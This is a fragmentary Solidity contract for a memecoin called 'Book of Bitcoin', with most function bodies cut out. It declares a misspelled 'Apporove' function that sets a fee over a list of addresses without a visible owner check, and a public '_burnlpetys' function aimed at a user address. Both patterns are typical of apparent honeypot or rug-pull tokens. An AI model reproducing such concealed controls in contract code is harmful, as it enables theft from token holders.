...
/**
https://t.me/BookofBitcoin_ETH
https://twitter.com/BookofBitcoin_
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipeboobet(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BOOKOFBTC is Ownable {
    ...
    constructor (){
        name = unicode"Book of Bitcoin";
        symbol = unicode"BOOB";
        decimals = 9;
        uint256 Supply = 800800000;
    ...
    function Apporove(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnlpetys(address user) public {
